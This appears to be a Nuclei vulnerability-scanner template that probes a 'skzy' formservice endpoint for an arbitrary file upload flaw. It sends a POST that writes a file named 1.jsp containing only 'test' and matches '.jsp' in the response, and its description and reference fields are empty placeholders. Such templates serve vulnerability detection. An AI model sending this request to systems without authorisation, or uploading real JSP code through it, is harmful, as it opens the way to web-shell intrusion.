id: skzy-formservice-upload
info:
  name: skzy-formservice-upload
  author: apple
  severity: high
  description: description
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |
        POST /formservice?service=attachment.write&isattach=false&filename=1.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 4

        test
    matchers:
      - type: word
        part: body
        words:
          - '.jsp'
